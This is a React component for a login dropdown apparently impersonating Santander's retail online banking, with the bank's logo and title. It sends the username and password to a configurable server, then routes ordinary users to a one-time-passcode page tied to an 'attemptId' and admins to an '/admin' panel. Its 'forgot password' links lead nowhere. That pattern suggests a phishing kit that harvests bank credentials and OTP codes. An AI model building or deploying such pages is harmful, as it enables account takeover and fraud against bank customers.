import React, { useState, FormEvent, useEffect, RefObject } from 'react';
import { X } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';
import { API_BASE_URL } from '../config';

export type LoginStatus = {
  type: 'idle' | 'loading' | 'error' | 'success';
  message?: string;
};

interface LoginPopupProps {
  isOpen: boolean;
  onClose: () => void;
  anchorRef: RefObject<HTMLElement>;
}

const LoginPopup: React.FC<LoginPopupProps> = ({ isOpen, onClose, anchorRef }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [website, setWebsite] = useState(''); // Honeypot
  const [status, setStatus] = useState<LoginStatus>({ type: 'idle' });
  const [position, setPosition] = useState<{ top: number; left: number } | null>(null);

  const navigate = useNavigate();
  const { setAuth } = useAuth();

  useEffect(() => {
    if (isOpen && anchorRef.current) {
      const rect = anchorRef.current.getBoundingClientRect();
      setPosition({
        top: rect.bottom + window.scrollY + 6, // 6px gap
        left: rect.left + window.scrollX,
      });
    }
  }, [isOpen, anchorRef]);

  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'unset'; // No overlay, so don't lock scroll
    }
    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [isOpen]);

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!username || !password) {
      setStatus({ type: 'error', message: 'Username and password are required.' });
      return;
    }
    setStatus({ type: 'loading' });

    try {
      const response = await fetch(`${API_BASE_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password, website }),
        credentials: 'include',
      });

      const data = await response.json();
      if (response.ok) {
        setStatus({ type: 'success' });
        if (data.isAdmin) {
          setAuth({ isAuthenticated: true, isAdmin: true });
          navigate('/admin');
        } else {
          navigate(`/otp?attemptId=${data.attemptId}`);
        }
        onClose(); 
      } else {
        setStatus({ type: 'error', message: data.message || 'An unknown error occurred' });
      }
    } catch (error) {
      setStatus({ type: 'error', message: 'Could not connect to the server.' });
    }
  };

  if (!isOpen || !position) return null;

  // Fallback for mobile: center modal if screen is very small
  const isMobile = typeof window !== 'undefined' && window.innerWidth < 500;

  return (
    <div>
      {/* Dropdown style for desktop, modal for mobile */}
      <div
        className={
          isMobile
            ? 'fixed inset-0 flex items-center justify-center z-50 bg-black bg-opacity-30'
            : 'absolute z-50'
        }
        style={
          isMobile
            ? undefined
            : { top: position.top, left: position.left, minWidth: 0, width: '180px' }
        }
      >
        <div className="bg-white rounded-lg shadow-lg border border-gray-200 p-2 w-[180px] text-[11px] relative">
          <div className="flex justify-between items-center mb-1">
            <img src="/santander-logo.svg" alt="Santander Logo" className="h-4 mb-1" />
        <button 
          onClick={onClose}
              className="text-gray-400 hover:text-gray-600 ml-2"
          aria-label="Close"
        >
              <X className="h-4 w-4" />
        </button>
          </div>
          <h2 className="text-xs font-semibold text-gray-700 text-center mb-2">Login to Retail Online Banking</h2>
          <form onSubmit={handleSubmit}>
            <div className="mb-2">
              <label htmlFor="user" className="block text-[10px] font-medium text-gray-600 mb-0.5">
                User:
              </label>
              <input
                type="text"
                id="user"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-1.5 py-1 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-red-500 text-[11px]"
                required
              />
            </div>
            <div className="mb-2">
              <label htmlFor="password" className="block text-[10px] font-medium text-gray-600 mb-0.5">
                Password:
              </label>
              <input
                type="password"
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-1.5 py-1 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-red-500 text-[11px]"
                required
              />
            </div>
            <div className="hidden" aria-hidden="true">
                <label htmlFor="website">Do not fill this out</label>
                <input
                  type="text"
                    id="website" 
                    name="website" 
                    tabIndex={-1} 
                    autoComplete="off"
                    value={website}
                    onChange={(e) => setWebsite(e.target.value)}
                />
            </div>
            {status.type === 'error' && (
              <div className="my-1 p-1 bg-red-50 text-red-700 rounded-md text-[10px] text-center">
                {status.message}
              </div>
            )}
              <button
                type="submit"
              className="w-full bg-red-600 hover:bg-red-700 text-white py-1 px-2 rounded-md font-bold text-[11px] transition-colors disabled:bg-red-400 mt-1"
              disabled={status.type === 'loading'}
              >
              {status.type === 'loading' ? 'Verifying...' : 'Login'}
              </button>
          </form>
          <div className="mt-2 border-t pt-2 space-y-1">
             <a href="#" className="block text-[10px] text-center text-blue-600 hover:underline">Forgot user ID?</a>
             <a href="#" className="block text-[10px] text-center text-blue-600 hover:underline">Forgot password?</a>
          </div>
          <div className="mt-2 border-t pt-2">
             <label htmlFor="online-services" className="block text-[10px] font-medium text-gray-600 mb-1">Online Services</label>
             <div className="flex space-x-1">
                <select id="online-services" className="flex-grow w-full px-1 py-1 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-red-500 text-[10px]">
                    <option>Retail Online Banking</option>
            </select>
                <button className="bg-red-600 text-white px-2 rounded-md text-[10px] font-bold hover:bg-red-700">
                  Ok
            </button>
             </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPopup;
